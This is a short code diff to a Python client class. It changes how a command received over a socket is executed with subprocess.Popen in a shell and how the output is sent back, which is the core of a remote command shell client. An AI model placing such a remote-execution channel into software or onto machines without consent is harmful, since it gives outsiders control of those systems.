@@ -67,8 +67,12 @@ class Client:
 
             
             else:
-                j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'") #Pretty much every shell uses -c to run lone commands.
-                self.sock.send(j.encode())
+                #j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'") #Pretty much every shell uses -c to run lone commands.
+
+                j = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE, executable=self.shell)
+                #out = j.stdout.read() + j.stderr.read()
+                out = j.communicate()
+                self.sock.send(out[0])
 
     def start(self):
         
